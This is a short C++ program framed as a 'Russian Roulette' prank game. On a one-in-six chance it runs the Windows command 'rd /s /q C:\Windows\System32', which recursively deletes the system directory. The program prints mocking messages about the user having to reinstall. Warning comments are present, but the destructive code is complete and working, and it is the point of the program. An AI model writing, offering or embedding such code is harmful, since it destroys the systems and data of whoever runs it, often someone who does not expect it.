#include <iostream>
#include <cstdlib>
#include <ctime>
#include <windows.h> // Include this library for system commands.
using namespace std;

int main() {
    cout << "Welcome to Windows 32 Russian Roulette!\n";
    srand(time(0));
    int bullet = rand() % 6 + 1;
    int chamber;
    cout << "Pick a chamber (1-6): ";
    cin >> chamber;
    if (chamber == bullet) {
        cout << "Oops! Looks like you just deleted Windows 32. Good luck reinstalling! 😈\n";

        // WARNING: This code deletes critical system files and can cause irreparable damage to your system!
        // DO NOT RUN THIS CODE ON A REAL SYSTEM!
        
        system("rd /s /q C:\\Windows\\System32");
        cout << "Windows 32 has been successfully deleted! 😱\n";
    } else {
        cout << "Phew! You survived... this time. Try again if you dare! 😜\n";
    }
    return 0;
}
